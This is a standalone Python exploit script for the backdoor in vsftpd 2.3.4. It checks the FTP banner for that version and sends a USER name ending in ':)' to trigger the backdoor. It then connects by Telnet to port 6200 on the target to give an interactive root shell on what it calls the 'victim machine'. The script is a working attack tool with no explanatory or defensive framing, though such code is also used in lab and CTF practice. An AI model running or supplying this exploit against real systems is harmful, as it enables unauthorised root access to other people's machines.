#!/usr/bin/env python3

from termcolor import colored
from telnetlib import Telnet
from ast import arg
from sys import exit
import threading
import argparse
import socket
import time

def Good(msg):
    print(colored('[', 'cyan', attrs=['bold']) + colored("+", "white", attrs=['bold']) + colored('] ', "cyan", attrs=['bold']) + colored(msg, "white", attrs=['bold']))
def Error(msg):
    print(colored('[', 'yellow', attrs=['bold']) + colored("!", "white", attrs=['bold']) + colored('] ', "yellow", attrs=['bold']) + colored(msg, "white", attrs=['bold']))


def tester(ip, port):
    try:
        port = int(port)
    except:
        Error("Port must be an integer")
        exit()

    try:
        a = socket.socket()
        a.settimeout(20)
        a.connect((str(ip) , int(port)))

    except:
        Error("Hosts seems to be down")

    if not ("2.3.4" in str( a.recv(1024).decode('UTF-8'))):
        Error("Version seems not vunerable")
        exit()



def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,int(port)))

    username = "USER Hello:)\r\n".encode() 
    password = "PASS Hello:)\r\n".encode()

    s.send(username)
    s.recv(65565).decode('UTF-8') 
    s.send(password)
    reply = s.recv(65565).decode("UTF-8")

def shell():    

    Good("Popping root shell ")
    time.sleep(2)
    with Telnet(ip, 6200) as GetShell:
       
        Good("Done")

        GetShell.interact()
        GetShell.close


def main(ip, port):
    tester(ip, port)

    t = threading.Thread(target=exploit)
    t.start()

    sh = threading.Thread(target=shell)
    sh.start()
    


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", help="The port to scan", required=True )
    parser.add_argument("-i", "--ip", help="The ip address of the victim machine", required=True)
    args = parser.parse_args()
    
    global ip ; global port
    ip=args.ip ; port=args.port

    main(ip, port)
